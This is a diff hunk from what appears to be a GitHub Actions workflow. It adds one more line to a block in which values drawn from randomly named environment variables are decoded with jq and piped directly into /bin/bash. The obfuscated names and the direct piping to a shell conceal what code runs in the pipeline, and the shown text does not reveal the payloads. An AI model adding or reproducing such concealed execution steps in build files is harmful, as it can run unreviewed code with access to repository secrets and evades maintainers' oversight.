@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$msvvk1733" | jq -r .seaci71363 | /bin/bash
           echo $jql4593 | jq -r .cib38 | /bin/bash
           echo $rqhmi5 | jq -r .yv77746 | /bin/bash
+          echo $xmith31 | jq -r .dc7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
